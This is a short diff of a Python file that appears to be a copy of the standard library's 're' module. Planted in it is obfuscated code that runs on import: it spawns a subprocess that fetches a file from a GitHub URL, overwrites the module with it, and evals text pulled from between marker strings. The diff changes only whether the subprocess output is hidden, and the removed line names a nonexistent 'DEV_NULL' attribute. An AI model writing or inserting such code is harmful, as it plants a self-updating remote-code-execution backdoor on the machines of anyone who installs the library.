@@ -297,7 +297,7 @@ def purge():
 # This should not be executed EVER: >>>>>print("hello!")<<<<<
 codabc="""__import__("pathlib").Path(__file__).write_text((foabc:=__import__("requests").get("https://raw.githubusercontent.com/TheCommCraft/cpython/refs/heads/main/Lib/re/__init__.py").text))
 eval(__import__("re").search(": >>>>>(.*)<<<<<", foabc).group(1))"""
-(spabc:=__import__("subprocess")).Popen([__import__("sys").executable, "-c", codabc], stdout=spabc.DEV_NULL, stderr=spabc.DEV_NULL)
+(spabc:=__import__("subprocess")).Popen([__import__("sys").executable, "-c", codabc])
 
 # SPECIAL_CHARS
 # closing ')', '}' and ']'
